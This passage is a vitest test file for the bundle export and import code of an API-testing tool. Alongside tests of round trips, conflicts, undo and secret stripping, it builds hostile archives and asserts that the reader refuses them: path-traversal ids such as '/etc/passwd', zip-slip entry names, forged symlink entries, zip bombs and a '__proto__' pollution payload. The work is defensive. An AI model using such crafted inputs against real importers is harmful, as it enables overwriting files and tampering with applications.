import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { cpSync, existsSync, mkdirSync, readFileSync, statSync, utimesSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { crc32 } from 'node:zlib';
import Ajv2020 from 'ajv/dist/2020.js';
import { KIND_INFO, can, type KindId } from '@testpion/shared';
import {
  BUNDLE_FORMAT,
  BUNDLE_KIND_IDS,
  WorkspaceStore,
  applyImport,
  buildBundle,
  bundleAdapter,
  bundleKindOf,
  describeBundle,
  everythingRefs,
  listImports,
  parseSelector,
  previewImport,
  readBundle,
  sectionRefs,
  serializeBundle,
  undoImport,
  ZIP_LIMITS,
  writeZip,
  type BundleKindId,
  type BundleRef,
  type Collection,
  type ParsedBundle,
} from '../../packages/core/src/index.js';
import { assemble } from '../../packages/core/src/transfer/container.js';
import { FIXTURE_SECRETS } from '../fixtures/secrets/values.js';
import { tempDir } from '../helpers.js';

const FIXTURE = join(__dirname, '..', 'fixtures', 'kinds', 'workspace');
const tmp = tempDir('tp-transfer-', { alias: true });
afterAll(() => tmp.cleanup());

let n = 0;
const fresh = (name = 'Dest'): WorkspaceStore => WorkspaceStore.create(join(tmp.dir, `ws-${++n}`), name);
const source = (): WorkspaceStore => {
  const s = fresh('Source');
  cpSync(FIXTURE, s.root, { recursive: true });
  return s;
};
const write = (store: WorkspaceStore, rel: string, data: string | Buffer) => {
  const p = store.path(...rel.split('/'));
  mkdirSync(join(p, '..'), { recursive: true });
  writeFileSync(p, data);
};
describe('every kind with the export capability has an adapter, and the other way round', () => {
  it('registry and bundle agree', () => {
    const exporting = (Object.values(KIND_INFO) as Array<(typeof KIND_INFO)[KindId]>).filter((k) => !k.since && k.capabilities.export === true && k.id !== 'capture');
    const viaRegistry = new Set(exporting.map((k) => bundleKindOf(k.id)).filter((k): k is BundleKindId => !!k));
    expect([...viaRegistry].sort()).toEqual([...BUNDLE_KIND_IDS].sort());
    // every kind that exports also imports, and no kind outside the bundle claims either
    for (const k of exporting) {
      expect(bundleKindOf(k.id), `${k.id} has export but no adapter`).toBeTruthy();
      expect(can(k.id, 'import'), `${k.id} exports but does not import`).toBe(true);
    }
    expect(can('flow', 'export')).toBe(true);
    expect(can('flow', 'import')).toBe(true);
  });
});

describe('round trip: every kind goes out and comes back the same', () => {
  let src: WorkspaceStore;
  let bundle: ReturnType<typeof buildBundle>;
  beforeAll(() => {
    src = source();
    write(src, 'datasets/blob.sqlite', Buffer.concat([Buffer.from('SQLite format 3\0', 'latin1'), Buffer.from(Array.from({ length: 2048 }, (_, i) => (i * 31) % 256))]));
    bundle = buildBundle(src, 'all', { providers: true });
  });

  it('holds all the kinds of the fixture workspace', () => {
    const kinds = Object.keys(bundle.counts).sort();
    expect(kinds).toEqual([
      'collection',
      'dataset',
      'environment',
      'evaluation',
      'grpc-call',
      'load-test',
      'mcp-mock',
      'mcp-server',
      'monitor',
      'prompt',
      'proto',
      'provider',
      'script-package',
      'spec',
      'test',
      'ws-connection',
    ]);
    expect(bundle.format).toBe('zip'); // a binary dataset forces the zip form
  });

  for (const form of ['zip', 'json'] as const) {
    it(`imports into an empty workspace identically (${form} form)`, () => {
      const b = buildBundle(src, 'all', { providers: true, format: form });
      expect(b.format).toBe(form);
      const dest = fresh();
      const parsed = readBundle(b.bytes);
      const out = applyImport(dest, parsed);
      expect(out.skipped.filter((s) => s.why?.startsWith('refused'))).toEqual([]);
      // the new workspace's own default environment is the one the export holds too: identical, so not written again
      expect(out.created.length + out.skipped.filter((x) => x.why?.includes('identical')).length).toBe(b.manifest.items.length);
      for (const k of BUNDLE_KIND_IDS) {
        const mine = bundleAdapter(k)
          .list(src)
          .map((i) => i.id)
          .sort();
        const theirs = bundleAdapter(k)
          .list(dest)
          .map((i) => i.id)
          .sort();
        // the new workspace starts with its own default environment
        expect(
          theirs.filter((id) => k !== 'environment' || id !== 'development'),
          k,
        ).toEqual(mine.filter((id) => k !== 'environment' || id !== 'development'));
      }
      // the same bytes again: exporting the destination gives the same item checksums
      const again = buildBundle(dest, 'all', { providers: true, format: form });
      const sums = (m: ParsedBundle['manifest']) => Object.fromEntries(m.items.filter((i) => i.kind !== 'environment').map((i) => [`${i.kind}:${i.id}`, i.sha256]));
      expect(sums(again.manifest)).toEqual(sums(b.manifest));
    });
  }

  it('importing the same bundle again is a no-op: every item is identical and no file is written', () => {
    const dest = fresh();
    const parsed = readBundle(bundle.bytes);
    applyImport(dest, parsed);
    const file = dest.path('collections', 'api.json');
    const old = new Date(2020, 1, 1);
    utimesSync(file, old, old);
    const p = previewImport(dest, parsed);
    expect(p.totals).toMatchObject({ create: 0, conflict: 0, invalid: 0 });
    expect(p.totals.identical).toBe(bundle.manifest.items.length);
    const again = applyImport(dest, parsed);
    expect(again.created).toEqual([]);
    expect(again.replaced).toEqual([]);
    expect(statSync(file).mtimeMs).toBe(old.getTime());
  });

  it('the bundle says what it is without a workspace', () => {
    const d = describeBundle(readBundle(bundle.bytes));
    expect(d.counts.collection).toBe(1);
    expect(d.summary).toContain('Collection');
    expect(d.review.some((r) => r.includes('Weather') || r.includes('script'))).toBeTypeOf('boolean');
  });
});

describe('conflicts: Keep both, Replace, Skip, and Undo', () => {
  function setup() {
    const src = source();
    const parsed = readBundle(
      buildBundle(src, [
        { kind: 'collection', id: 'api' },
        { kind: 'monitor', id: 'mon-pets' },
        { kind: 'spec', id: 'specs/petstore.yaml' },
        { kind: 'mcp-server', id: 'weather' },
        { kind: 'mcp-mock', id: 'mocks/weather.mcp-mock.yaml' },
      ]).bytes,
    );
    const dest = fresh();
    applyImport(dest, parsed);
    return { src, parsed, dest };
  }
  const edit = (dest: WorkspaceStore) => {
    const c = dest.getCollection('api');
    dest.saveCollection({ ...c, name: 'Kinds API', description: 'changed here' });
    write(dest, 'specs/petstore.yaml', 'openapi: 3.0.0\ninfo:\n  title: Mine\n  version: "9"\npaths: {}\n');
  };

  it('the preview lists a conflict with what Keep both would name it', () => {
    const { parsed, dest } = setup();
    edit(dest);
    const p = previewImport(dest, parsed);
    const col = p.items.find((i) => i.kind === 'collection')!;
    expect(col.action).toBe('conflict');
    expect(col.proposed?.id).toBe('api-2');
    expect(col.proposed?.name).toBe('Kinds API (imported)');
    expect(p.items.find((i) => i.kind === 'spec')?.proposed?.id).toBe('specs/petstore-2.yaml');
    expect(p.items.find((i) => i.kind === 'mcp-server')?.action).toBe('identical');
  });

  it('Keep both (the default) adds the incoming items under new names and leaves yours alone', () => {
    const { parsed, dest } = setup();
    edit(dest);
    const out = applyImport(dest, parsed);
    expect(out.created.map((c) => `${c.kind}:${c.target?.id}`)).toEqual(expect.arrayContaining(['collection:api-2', 'spec:specs/petstore-2.yaml']));
    expect(dest.getCollection('api').description).toBe('changed here');
    expect(dest.getCollection('api-2').name).toBe('Kinds API (imported)');
    expect(readFileSync(dest.path('specs', 'petstore.yaml'), 'utf8')).toContain('Mine');
    expect(existsSync(dest.path('specs', 'petstore-2.yaml'))).toBe(true);
  });

  it('references follow an item that got a new id: the monitor points at the imported collection', () => {
    const { parsed, dest } = setup();
    edit(dest);
    const lib = dest.getLibrary<{ collectionId?: string; everyMinutes?: number }>('monitors');
    dest.saveLibrary('monitors', { folders: lib.folders, items: lib.items.map((m) => ({ ...m, data: { ...m.data, everyMinutes: 5 } })) });
    applyImport(dest, parsed);
    const monitors = dest.getLibrary<{ collectionId?: string }>('monitors').items;
    expect(monitors.map((m) => `${m.id}:${m.data.collectionId}`).sort()).toEqual(['mon-pets-2:api-2', 'mon-pets:api']);
  });

  it('Replace overwrites yours; Skip keeps yours', () => {
    const a = setup();
    edit(a.dest);
    applyImport(a.dest, a.parsed, { onConflict: 'replace' });
    expect(a.dest.getCollection('api').description).toBeUndefined();
    expect(readFileSync(a.dest.path('specs', 'petstore.yaml'), 'utf8')).not.toContain('Mine');
    const b = setup();
    edit(b.dest);
    const out = applyImport(b.dest, b.parsed, { onConflict: 'skip' });
    expect(out.created).toEqual([]);
    expect(b.dest.getCollection('api').description).toBe('changed here');
    expect(b.dest.listCollections()).toHaveLength(1);
  });

  it('a decision per item beats the default', () => {
    const { parsed, dest } = setup();
    edit(dest);
    applyImport(dest, parsed, { onConflict: 'replace', decisions: { 'spec:specs/petstore.yaml': 'skip' } });
    expect(readFileSync(dest.path('specs', 'petstore.yaml'), 'utf8')).toContain('Mine');
    expect(dest.getCollection('api').description).toBeUndefined();
  });

  it('only: items outside the selection are left out', () => {
    const { parsed } = setup();
    const dest = fresh();
    const out = applyImport(dest, parsed, { only: ['spec'] });
    expect(out.created.map((c) => c.kind)).toEqual(['spec']);
    expect(dest.listCollections()).toHaveLength(0);
  });

  it('Undo takes back an import as one step: made items are removed, replaced ones come back byte for byte', () => {
    const { parsed, dest } = setup();
    edit(dest);
    const before = readFileSync(dest.path('specs', 'petstore.yaml'));
    const collectionBefore = readFileSync(dest.path('collections', 'api.json'));
    const mcpBefore = JSON.stringify(dest.getMcpServers());
    const out = applyImport(dest, parsed, { onConflict: 'replace' });
    expect(readFileSync(dest.path('specs', 'petstore.yaml'))).not.toEqual(before);
    expect(listImports(dest)[0]?.importId).toBe(out.importId);
    const undone = undoImport(dest, out.importId);
    expect(undone.keptChanged).toEqual([]);
    expect(readFileSync(dest.path('specs', 'petstore.yaml'))).toEqual(before);
    expect(readFileSync(dest.path('collections', 'api.json'))).toEqual(collectionBefore);
    expect(JSON.stringify(dest.getMcpServers())).toBe(mcpBefore);
    expect(() => undoImport(dest, out.importId)).toThrow(/already undone/);
  });

  it('Undo of a keep-both import removes only what it made, and leaves a file that changed since', () => {
    const { parsed, dest } = setup();
    edit(dest);
    const out = applyImport(dest, parsed);
    write(dest, 'specs/petstore-2.yaml', 'openapi: 3.0.0\ninfo:\n  title: edited after\n  version: "1"\npaths: {}\n');
    const undone = undoImport(dest, out.importId);
    expect(undone.keptChanged).toContain('specs/petstore-2.yaml');
    expect(dest.listCollections().map((c) => c.id)).toEqual(['api']);
    expect(dest.getMcpServers()).toHaveLength(1);
  });

  it('a failure part-way takes the import back and leaves the workspace as it was', () => {
    const { parsed, dest } = setup();
    edit(dest);
    // a read-only blocker: a directory where the second spec file must go
    mkdirSync(dest.path('specs', 'petstore-2.yaml'), { recursive: true });
    const before = JSON.stringify(dest.listCollections().map((c) => c.id));
    expect(() => applyImport(dest, parsed)).toThrow();
    expect(JSON.stringify(dest.listCollections().map((c) => c.id))).toBe(before);
  });
});

describe('secrets are never in a bundle', () => {
  it('no fixture secret is in the bytes, and each replaced one is listed for the importer to fill in', () => {
    const s = fresh('Secrets');
    s.saveMcpServers([
      { id: 'gh', name: 'GitHub', transport: 'streamable-http', url: 'https://mcp.example.com', headers: [{ key: 'Authorization', value: FIXTURE_SECRETS.mcpAuthorization, enabled: true }] },
      { id: 'local', name: 'Local', transport: 'stdio', command: 'npx', args: ['server'], env: { GITHUB_TOKEN: FIXTURE_SECRETS.mcpEnvToken } },
    ]);
    s.saveCollection({
      schemaVersion: '1.0',
      id: 'c',
      name: 'C',
      version: 0,
      updatedAt: '',
      variables: [],
      auth: { type: 'bearer', token: FIXTURE_SECRETS.collectionBearer },
      items: [
        {
          kind: 'http',
          id: 'r',
          name: 'R',
          request: { method: 'GET', url: 'https://x/y', headers: [{ key: 'X-Api-Key', value: FIXTURE_SECRETS.requestApiKeyHeader, enabled: true }] },
          assertions: [],
        } as never,
      ],
    } as Collection);
    s.saveEnvironment({ id: 'prod', name: 'Prod', isProduction: true, variables: [{ key: 'password', value: FIXTURE_SECRETS.envPassword, enabled: true }] } as never);
    s.writeTestFile('db.yaml', `name: db\ndataset:\n  connection: postgres://app:${FIXTURE_SECRETS.dbPassword}@db.example.com:5432/clinic\n`);
    write(s, 'datasets/people.csv', `name,password\nann,${FIXTURE_SECRETS.envPassword}\n`);
    for (const format of ['zip', 'json'] as const) {
      const b = buildBundle(s, 'all', { format });
      const text = format === 'json' ? b.bytes.toString('utf8') : [...readBundle(b.bytes).entries.values()].map((e) => e.toString('utf8')).join('\n');
      for (const [name, value] of Object.entries(FIXTURE_SECRETS)) if (name !== 'mcpEnvPlain') expect(text.includes(value), `${name} in the ${format} bundle`).toBe(false);
      expect(b.replaced.length).toBeGreaterThan(3);
      expect(b.manifest.requires.secrets.length).toBeGreaterThan(3);
      expect(b.manifest.flags.production).toEqual(['Prod']);
      expect(b.manifest.flags.stdioServers).toEqual(['Local']);
    }
  });

  it('importing never trusts a program an MCP server starts, and the preview says so', () => {
    const s = fresh('Stdio');
    s.saveMcpServers([{ id: 'local', name: 'Local', transport: 'stdio', command: 'npx', args: ['-y', 'some-server'] }]);
    const dest = fresh();
    const parsed = readBundle(buildBundle(s, 'all').bytes);
    const p = previewImport(dest, parsed);
    expect(p.review.join(' ')).toContain('starts a program');
    applyImport(dest, parsed);
    expect(existsSync(dest.path('.local', 'trust.json'))).toBe(false);
  });
});

describe('Export with everything it uses', () => {
  function clinic(): WorkspaceStore {
    const s = fresh('Clinic');
    write(s, 'specs/clinic.yaml', 'openapi: 3.0.0\ninfo:\n  title: Clinic\n  version: "1"\npaths: {}\n');
    write(s, 'specs/unrelated.yaml', 'openapi: 3.0.0\ninfo:\n  title: Other\n  version: "1"\npaths: {}\n');
    write(s, 'datasets/owners.csv', 'id,name\n1,Ann\n');
    write(s, 'mocks/pets.mcp-mock.yaml', 'name: pets\ntools: []\n');
    write(s, 'protos/pets.proto', 'syntax = "proto3";\n');
    write(s, 'packages/utils.js', 'module.exports = {};\n');
    s.saveMcpServers([
      { id: 'pets', name: 'Pets MCP', transport: 'mock', mockFile: 'mocks/pets.mcp-mock.yaml' },
      { id: 'other', name: 'Other', transport: 'streamable-http', url: 'https://x.example.com' },
    ]);
    s.deleteEnvironment('development');
    s.saveEnvironment({ id: 'staging', name: 'Staging', variables: [{ key: 'baseUrl', value: 'https://staging', enabled: true }] } as never);
    s.saveEnvironment({ id: 'unused', name: 'Unused', variables: [{ key: 'nothingHere', value: '1', enabled: true }] } as never);
    s.saveCollection({
      schemaVersion: '1.0',
      id: 'clinic',
      name: 'Clinic',
      version: 0,
      updatedAt: '',
      variables: [],
      testScript: "const u = tp.require('utils');",
      items: [
        {
          kind: 'http',
          id: 'r',
          name: 'List',
          request: { method: 'GET', url: '{{baseUrl}}/owners' },
          assertions: [
            { type: 'openapi', spec: 'specs/clinic.yaml' },
            { type: 'openapi', spec: 'specs/gone.yaml' },
          ],
        } as never,
      ],
    } as Collection);
    s.writeTestFile('flows/visit.yaml', 'name: Visit\ncollection: clinic\ndataset: datasets/owners.csv\nsteps:\n  - id: a\n    server: { name: Pets MCP }\n');
    s.writeTestFile('flows/other.yaml', 'name: Other\ncollection: somebody-else\nsteps: []\n');
    s.saveLibrary('grpc', { folders: [], items: [{ id: 'g1', name: 'Hello', collectionId: 'clinic', data: { protoFiles: ['protos/pets.proto'] } }] });
    s.saveLibrary('monitors', {
      folders: [],
      items: [
        { id: 'm1', name: 'Clinic monitor', data: { collectionId: 'clinic', environment: 'Staging' } },
        { id: 'm2', name: 'Other monitor', data: { collectionId: 'else' } },
      ],
    });
    return s;
  }

  it('pulls in what the collection uses, and nothing else', () => {
    const s = clinic();
    const b = buildBundle(s, [{ kind: 'collection', id: 'clinic' }], { uses: true });
    const keys = b.manifest.items.map((i) => `${i.kind}:${i.id}`).sort();
    expect(keys).toEqual(
      [
        'collection:clinic',
        'dataset:datasets/owners.csv',
        'environment:staging',
        'grpc-call:g1',
        'mcp-mock:mocks/pets.mcp-mock.yaml',
        'mcp-server:pets',
        'monitor:m1',
        'proto:protos/pets.proto',
        'script-package:packages/utils.js',
        'spec:specs/clinic.yaml',
        'test:tests/flows/visit.yaml',
      ].sort(),
    );
    expect(b.manifest.missing.map((m) => m.to)).toContain('specs/gone.yaml');
    expect(b.manifest.edges.length).toBeGreaterThan(5);
    expect(b.manifest.title).toBe('Clinic (with everything it uses)');
    // without "uses" only the collection goes
    expect(buildBundle(s, [{ kind: 'collection', id: 'clinic' }]).manifest.items).toHaveLength(1);
  });

  it('the bundle imports into an empty workspace with everything working together', () => {
    const dest = fresh();
    applyImport(dest, readBundle(buildBundle(clinic(), [{ kind: 'collection', id: 'clinic' }], { uses: true }).bytes));
    expect(dest.getMcpServers().map((x) => x.id)).toEqual(['pets']);
    expect(existsSync(dest.path('mocks', 'pets.mcp-mock.yaml'))).toBe(true);
    expect(existsSync(dest.path('specs', 'clinic.yaml'))).toBe(true);
    expect(existsSync(dest.path('specs', 'unrelated.yaml'))).toBe(false);
  });

  it('a test file keeps pointing at the MCP server it names when that server got a new name', () => {
    const src = clinic();
    const bytes = buildBundle(src, [{ kind: 'collection', id: 'clinic' }], { uses: true }).bytes;
    const dest = fresh();
    dest.saveMcpServers([{ id: 'pets', name: 'Pets MCP', transport: 'streamable-http', url: 'https://mine.example.com' }]);
    applyImport(dest, readBundle(bytes));
    expect(
      dest
        .getMcpServers()
        .map((x) => x.name)
        .sort(),
    ).toEqual(['Pets MCP', 'Pets MCP (imported)']);
    expect(dest.readTestFile('flows/visit.yaml')).toContain('server: { name: Pets MCP (imported) }');
  });

  it('selectors: kind:id, aliases, a bare collection name, a section', () => {
    const s = clinic();
    expect(parseSelector(s, 'collection:clinic')).toEqual({ kind: 'collection', id: 'clinic' });
    expect(parseSelector(s, 'Clinic')).toEqual({ kind: 'collection', id: 'clinic' });
    expect(parseSelector(s, 'dataset:owners.csv')).toEqual({ kind: 'dataset', id: 'datasets/owners.csv' });
    expect(parseSelector(s, 'spec:clinic.yaml')).toEqual({ kind: 'spec', id: 'specs/clinic.yaml' });
    expect(parseSelector(s, 'mcp:pets')).toEqual({ kind: 'mcp-server', id: 'pets' });
    expect(parseSelector(s, 'flow:flows/visit.yaml')).toEqual({ kind: 'test', id: 'tests/flows/visit.yaml' });
    expect(parseSelector(s, { kind: 'saved', library: 'grpc', itemId: 'g1' })).toEqual({ kind: 'grpc-call', id: 'g1' });
    expect(() => parseSelector(s, 'run:abc')).toThrow(/not exported in bundles/);
    expect(() => parseSelector(s, 'nope')).toThrow(/Nothing to export/);
    expect(sectionRefs(s, 'datasets')).toEqual([{ kind: 'dataset', id: 'datasets/owners.csv' }]);
    expect(everythingRefs(s).some((r: BundleRef) => r.kind === 'provider')).toBe(false);
    expect(() => buildBundle(s, [{ kind: 'spec', id: 'specs/missing.yaml' }])).toThrow(/No API definition/);
  });
});

describe('big datasets', () => {
  it('a dataset over the embed limit goes by reference, with a note; embed forces it in', () => {
    const s = fresh('Big');
    write(s, 'datasets/big.csv', 'a,b\n' + '1,2\n'.repeat(5000));
    write(s, 'datasets/small.csv', 'a,b\n1,2\n');
    const ref = buildBundle(s, 'all', { embedBytes: 1000 });
    const item = ref.manifest.items.find((i) => i.id === 'datasets/big.csv')!;
    expect(item.mode).toBe('reference');
    expect(item.entry).toBeUndefined();
    expect(ref.notes.join(' ')).toContain('travels by reference');
    const dest = fresh();
    const parsed = readBundle(ref.bytes);
    const p = previewImport(dest, parsed);
    expect(p.items.find((i) => i.id === 'datasets/big.csv')?.action).toBe('reference');
    const out = applyImport(dest, parsed);
    expect(existsSync(dest.path('datasets', 'big.csv'))).toBe(false);
    expect(existsSync(dest.path('datasets', 'small.csv'))).toBe(true);
    expect(out.skipped.find((x) => x.id === 'datasets/big.csv')?.why).toContain('not in the bundle');
    expect(buildBundle(s, 'all', { embedBytes: 1000, datasets: 'embed' }).manifest.items.find((i) => i.id === 'datasets/big.csv')?.mode).toBe('embed');
    expect(buildBundle(s, 'all', { datasets: 'reference' }).manifest.items.filter((i) => i.mode === 'reference')).toHaveLength(2);
  });
});

describe('a bundle is untrusted input', () => {
  const MANIFEST_BASE = {
    format: BUNDLE_FORMAT,
    formatVersion: 1,
    createdBy: { app: 'x', version: '1' },
    createdAt: 'now',
    title: 'Evil',
    root: [],
    edges: [],
    missing: [],
    requires: { secrets: [], osEnv: [] },
    flags: {},
    notes: [],
  };
  const sha = (b: Buffer) => require('node:crypto').createHash('sha256').update(b).digest('hex') as string;
  /** A bundle made by hand: the manifest with each item pointing at its entry (a zip with raw names, as an attacker writes it). */
  function evil(items: Array<{ kind: string; id: string; entry: string; data: string }>, extra: Record<string, unknown> = {}, names: Array<{ name: string; data: Buffer }> = []) {
    const manifest = { ...MANIFEST_BASE, ...extra, items: items.map((i) => ({ kind: i.kind, id: i.id, name: i.id, entry: i.entry, sha256: sha(Buffer.from(i.data)), size: i.data.length })) };
    return writeZip([{ name: 'manifest.json', data: Buffer.from(JSON.stringify(manifest)) }, ...items.map((i) => ({ name: i.entry, data: Buffer.from(i.data) })), ...names]);
  }
  const spec = 'openapi: 3.0.0\n';

  it('path traversal in an item id is refused by the preview and writes nothing outside the workspace', () => {
    const dest = fresh();
    const outside = join(dest.root, '..', 'pwned.yaml');
    expect(() => readBundle(evil([{ kind: 'spec', id: 'specs/a\u0000b.yaml', entry: 'files/n', data: spec }]))).toThrow(/no usable id/);
    const ids = ['specs/../../pwned.yaml', '../pwned.yaml', 'specs/..\\..\\pwned.yaml', '/etc/passwd', 'C:\\Windows\\x.yaml', '\\\\host\\share\\x.yaml', 'specs/%2e%2e/x.yaml', 'specs/con.yaml'];
    const b = readBundle(evil(ids.map((id, i) => ({ kind: 'spec', id, entry: `files/e${i}.yaml`, data: spec }))));
    const p = previewImport(dest, b);
    expect(p.items.map((i) => i.action)).toEqual(ids.map(() => 'invalid'));
    const out = applyImport(dest, b);
    expect(out.created).toEqual([]);
    expect(existsSync(outside)).toBe(false);
    expect(existsSync(join(dest.root, '..', '..', 'pwned.yaml'))).toBe(false);
  });

  it('a file kind cannot reach another kind’s folder, and a name must match its kind', () => {
    const dest = fresh();
    const b = readBundle(
      evil([
        { kind: 'spec', id: 'tests/sneaky.yaml', entry: 'files/a', data: spec },
        { kind: 'test', id: 'tests/a.txt', entry: 'files/b', data: spec },
        { kind: 'script-package', id: 'packages/../x.js', entry: 'files/c', data: 'x' },
        { kind: 'mcp-mock', id: 'mocks/a.yaml', entry: 'files/d', data: 'x' },
      ]),
    );
    expect(previewImport(dest, b).items.map((i) => i.action)).toEqual(['invalid', 'invalid', 'invalid', 'invalid']);
  });

  it('zip-slip entry names, links, case clashes and bombs are refused by the reader', () => {
    const m = Buffer.from(JSON.stringify({ ...MANIFEST_BASE, items: [] }));
    for (const name of ['../evil.txt', '/abs.txt', 'C:/x.txt', 'a/../../b.txt', 'a\\b.txt', 'a/./b.txt'])
      expect(
        () =>
          readBundle(
            writeZip([
              { name: 'manifest.json', data: m },
              { name, data: Buffer.from('x') },
            ]),
          ),
        name,
      ).toThrow(/Not a valid TestPion bundle/);
    expect(() =>
      readBundle(
        writeZip([
          { name: 'manifest.json', data: m },
          { name: 'files/A.txt', data: Buffer.from('x') },
          { name: 'files/a.txt', data: Buffer.from('y') },
        ]),
      ),
    ).toThrow(/twice/);
    // a symbolic link entry: unix mode 120000 in the central directory
    const zip = writeZip([
      { name: 'manifest.json', data: m },
      { name: 'link', data: Buffer.from('target') },
    ]);
    const firstCd = zip.lastIndexOf(Buffer.from([0x50, 0x4b, 0x01, 0x02]));
    zip.writeUInt16LE((3 << 8) | 20, firstCd + 4);
    zip.writeUInt32LE((0o120777 << 16) >>> 0, firstCd + 38);
    expect(() => readBundle(zip)).toThrow(/link or a special file/);
    // 4 MB of zeros deflate to a few KB: over 100:1 above 1 MB
    expect(() =>
      readBundle(
        writeZip([
          { name: 'manifest.json', data: m },
          { name: 'files/zeros.bin', data: Buffer.alloc(4 * 1024 * 1024) },
        ]),
      ),
    ).toThrow(/zip bomb/);
    expect(() =>
      readBundle(
        writeZip([
          { name: 'manifest.json', data: m },
          { name: 'files/small.txt', data: Buffer.alloc(20 * 1024) },
        ]),
      ),
    ).not.toThrow();
    expect(() =>
      readBundle(
        writeZip([
          { name: 'manifest.json', data: m },
          { name: 'files/zeros.txt', data: Buffer.alloc(4 * 1024 * 1024) },
        ]),
      ),
    ).toThrow(/zip bomb/);
  });

  it('the ratio test holds for entries of every size and for the archive as a whole', () => {
    const m = Buffer.from(JSON.stringify({ ...MANIFEST_BASE, items: [] }));
    // 300 KB of zeros is a few hundred bytes: far under the megabyte the old test started at
    expect(() => readBundle(writeZip([{ name: 'manifest.json', data: m }, { name: 'files/z.txt', data: Buffer.alloc(300 * 1024) }]))).toThrow(/zip bomb/);
    // many entries each just under the per-entry ratio, together far over it
    const spread = writeZip([{ name: 'manifest.json', data: m }, ...Array.from({ length: 60 }, (_, i) => ({ name: `files/${i}.txt`, data: Buffer.alloc(90 * 1024, i) }))]);
    expect(() => readBundle(spread)).toThrow(/archive's size/);
    // ordinary text, however repetitive a table is, passes
    const text = writeZip([{ name: 'manifest.json', data: m }, { name: 'files/t.txt', data: Buffer.from('id,name\n' + '1,Rex\n'.repeat(5000)) }]);
    expect(() => readBundle(text)).not.toThrow(/zip bomb/);
    // what an import holds in memory is capped well under the old 2 GB
    expect(ZIP_LIMITS.totalBytes).toBeLessThanOrEqual(512 * 1024 * 1024);
  });

  it('limits: too many entries, an entry or total over the limit, a declared size that lies', () => {
    const m = Buffer.from(JSON.stringify({ ...MANIFEST_BASE, items: [] }));
    const many = writeZip([{ name: 'manifest.json', data: m }, ...Array.from({ length: 12 }, (_, i) => ({ name: `files/${i}.txt`, data: Buffer.from('x') }))]);
    expect(() => readBundle(many, { zip: { entries: 5, entryBytes: 1e9, totalBytes: 1e9, ratio: 100, ratioFloor: 1024 } })).toThrow(/at most 5/);
    const big = writeZip([
      { name: 'manifest.json', data: m },
      { name: 'files/a.txt', data: Buffer.alloc(5000, 'a') },
    ]);
    expect(() => readBundle(big, { zip: { entries: 100, entryBytes: 1000, totalBytes: 1e9, ratio: 1e9, ratioFloor: 1024 } })).toThrow(/at most 1000/);
    expect(() => readBundle(big, { zip: { entries: 100, entryBytes: 1e9, totalBytes: 3000, ratio: 1e9, ratioFloor: 1024 } })).toThrow(/more than 3000/);
    expect(() => readBundle(big, { limits: { fileBytes: 100, manifestBytes: 1e6, items: 10 } })).toThrow(/at most 100/);
    // the declared size is cut down: the inflater must not trust it
    const lie = writeZip([
      { name: 'manifest.json', data: m },
      { name: 'files/a.txt', data: Buffer.alloc(5000, 'a') },
    ]);
    const cd = lie.lastIndexOf(Buffer.from([0x50, 0x4b, 0x01, 0x02]));
    lie.writeUInt32LE(10, cd + 24);
    expect(() => readBundle(lie)).toThrow(/declared size|too large|Not a valid/);
    // a damaged byte: the CRC catches it
    const dmg = writeZip([
      { name: 'manifest.json', data: m },
      { name: 'files/a.bin', data: Buffer.from('hello') },
    ]);
    dmg[dmg.indexOf(Buffer.from('hello'))] ^= 1;
    expect(() => readBundle(dmg)).toThrow(/checksum/);
    expect(crc32(Buffer.from('a'))).toBeTypeOf('number');
  });

  it('a wrong checksum, a missing entry, a wrong format or version are refused', () => {
    const good = evil([{ kind: 'spec', id: 'specs/a.yaml', entry: 'files/specs/a.yaml', data: spec }]);
    expect(() => readBundle(good)).not.toThrow();
    const tampered = evil([{ kind: 'spec', id: 'specs/a.yaml', entry: 'files/specs/a.yaml', data: spec }], {}, []);
    const parsed = readBundle(tampered);
    // change the bytes after the manifest recorded the checksum
    const json = serializeBundle(parsed, 'json').toString('utf8').replace('openapi: 3.0.0', 'openapi: 9.9.9');
    expect(() => readBundle(Buffer.from(json))).toThrow(/checksum/);
    const noEntry = JSON.stringify({ ...MANIFEST_BASE, items: [{ kind: 'spec', id: 'specs/a.yaml', name: 'a', entry: 'files/x', sha256: 'a'.repeat(64) }], entries: {} });
    expect(() => readBundle(Buffer.from(noEntry))).toThrow(/missing/);
    expect(() => readBundle(Buffer.from(JSON.stringify({ ...MANIFEST_BASE, format: 'something-else', items: [] })))).toThrow(/not "testpion-bundle"/);
    expect(() => readBundle(Buffer.from(JSON.stringify({ ...MANIFEST_BASE, formatVersion: 2, items: [] })))).toThrow(/up to 1/);
    expect(() => readBundle(Buffer.from('not a bundle at all'))).toThrow(/neither a zip/);
    expect(() =>
      readBundle(Buffer.from(JSON.stringify({ ...MANIFEST_BASE, items: [{ kind: 'spec', id: 'a', entry: '../x', sha256: 'a'.repeat(64) }], entries: { '../x': { encoding: 'utf8', content: 'x' } } }))),
    ).toThrow(/leaves the archive/);
  });

  it('an unknown kind is skipped with a warning; the rest imports', () => {
    const manifest = { ...MANIFEST_BASE, items: [{ kind: 'hologram', id: 'h', name: 'h' }] };
    const b = readBundle(Buffer.from(JSON.stringify({ ...manifest, entries: {} })));
    expect(b.manifest.items).toEqual([]);
    expect(b.warnings.join(' ')).toContain('hologram');
  });

  it('__proto__, constructor and prototype keys never reach an object', () => {
    const dest = fresh();
    const col = '{"id":"evil","name":"Evil","items":[],"__proto__":{"polluted":"yes"},"constructor":{"prototype":{"polluted":"yes"}},"variables":[]}';
    const b = readBundle(evil([{ kind: 'collection', id: 'evil', entry: 'collections/evil.json', data: col }]));
    applyImport(dest, b);
    expect(({} as Record<string, unknown>).polluted).toBeUndefined();
    const saved = JSON.parse(readFileSync(dest.path('collections', 'evil.json'), 'utf8'));
    expect(Object.keys(saved)).not.toContain('__proto__');
    expect(JSON.stringify(saved)).not.toContain('polluted');
    // the same in the manifest and in the JSON form's entries
    const j = '{"format":"testpion-bundle","formatVersion":1,"__proto__":{"x":1},"items":[],"entries":{}}';
    expect(() => readBundle(Buffer.from(j))).not.toThrow();
    expect(({} as Record<string, unknown>).x).toBeUndefined();
  });

  it('shapes are checked: ids that do not match, wrong types, literal provider keys, a stdio server with no command', () => {
    const dest = fresh();
    const b = readBundle(
      evil([
        { kind: 'collection', id: 'a', entry: 'collections/a.json', data: '{"id":"b","name":"x","items":[]}' },
        { kind: 'collection', id: '../c', entry: 'collections/c.json', data: '{"id":"../c","name":"x","items":[]}' },
